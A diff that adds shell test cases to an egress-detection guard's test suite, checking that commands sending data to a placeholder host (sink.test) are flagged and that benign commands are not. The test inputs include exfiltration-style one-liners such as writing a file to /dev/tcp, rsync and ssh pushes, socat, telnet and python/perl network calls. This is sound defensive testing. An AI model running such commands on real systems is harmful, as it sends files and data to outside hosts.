@@ -150,6 +150,48 @@ arm_fresh
 out=$(egress_for "HTTP https://evil.test/x")
 is_ask "$out" && ok "armed + HTTP (uppercase httpie) → ask" || bad "armed + HTTP (uppercase httpie) → ask (out=$out)"
 
+# coverage expansion (stress-test findings) — low-FP egress vectors
+arm_fresh; out=$(egress_for "rsync /tmp/f user@sink.test:/p")
+is_ask "$out" && ok "armed + rsync → ask" || bad "armed + rsync → ask (out=$out)"
+arm_fresh; out=$(egress_for "ssh user@sink.test \"cat > /p\"")
+is_ask "$out" && ok "armed + ssh remote-exec → ask" || bad "armed + ssh → ask (out=$out)"
+arm_fresh; out=$(egress_for "socat - TCP:sink.test:9000")
+is_ask "$out" && ok "armed + socat → ask" || bad "armed + socat → ask (out=$out)"
+arm_fresh; out=$(egress_for "telnet sink.test 9000")
+is_ask "$out" && ok "armed + telnet → ask" || bad "armed + telnet → ask (out=$out)"
+arm_fresh; out=$(egress_for "openssl s_client -connect sink.test:443")
+is_ask "$out" && ok "armed + openssl s_client → ask" || bad "armed + openssl s_client → ask (out=$out)"
+arm_fresh; out=$(egress_for "cat /tmp/f > /dev/tcp/sink.test/9000")
+is_ask "$out" && ok "armed + /dev/tcp → ask" || bad "armed + /dev/tcp → ask (out=$out)"
+arm_fresh; out=$(egress_for "exec 3<>/dev/udp/sink.test/53")
+is_ask "$out" && ok "armed + /dev/udp → ask" || bad "armed + /dev/udp → ask (out=$out)"
+
+# ONELINER flag-skip precision fix (a flag before -c/-e must not evade)
+arm_fresh; out=$(egress_for "python3 -u -c \"import requests; requests.post(u)\"")
+is_ask "$out" && ok "armed + python3 -u -c (flag-skip) → ask" || bad "armed + python3 -u -c → ask (out=$out)"
+arm_fresh; out=$(egress_for "perl -MLWP::Simple -e \"getstore(u,f)\"")
+is_ask "$out" && ok "armed + perl -M…-e (flag-skip) → ask" || bad "armed + perl flag-skip → ask (out=$out)"
+
+# negatives: new tools must NOT false-positive on benign subcommands
+arm_fresh; out=$(egress_for "ssh-keygen -t ed25519"); ec=$?
+{ [ $ec -eq 0 ] && [ -z "$out" ]; } && ok "ssh-keygen → defer (no ssh FP)" || bad "ssh-keygen → defer (out=$out)"
+arm_fresh; out=$(egress_for "openssl genrsa -out k.pem 2048"); ec=$?
+{ [ $ec -eq 0 ] && [ -z "$out" ]; } && ok "openssl genrsa → defer (only s_client)" || bad "openssl genrsa → defer (out=$out)"
+arm_fresh; out=$(egress_for "python3 -u -c \"print(1)\""); ec=$?
+{ [ $ec -eq 0 ] && [ -z "$out" ]; } && ok "python3 -u -c no-net → defer" || bad "python3 -u -c no-net → defer (out=$out)"
+# broadened ONELINER must not fire on a non-interpreter command that merely mentions a net word
+arm_fresh; out=$(egress_for "git commit -m \"use the requests library\""); ec=$?
+{ [ $ec -eq 0 ] && [ -z "$out" ]; } && ok "git commit mentioning 'requests' → defer" || bad "git commit net-word → defer (out=$out)"
+# telnet token must not substring-match telnetd / etc.
+arm_fresh; out=$(egress_for "telnetd --version"); ec=$?
+{ [ $ec -eq 0 ] && [ -z "$out" ]; } && ok "telnetd → defer (no telnet substring FP)" || bad "telnetd → defer (out=$out)"
+
+# allowlist exemption still applies to ssh/rsync user@host forms
+arm_fresh; echo "trusted.test" > "$CFG/url-allowlist.txt"
+out=$(egress_for "ssh user@trusted.test \"x\""); ec=$?
+{ [ $ec -eq 0 ] && [ -z "$out" ]; } && ok "ssh to allowlisted host → defer" || bad "ssh allowlisted → defer (out=$out)"
+rm -f "$CFG/url-allowlist.txt"
+
 echo ""
 echo "Results: $PASS passed, $FAIL failed (total $((PASS + FAIL)))"
 if [ "$FAIL" -ne 0 ]; then
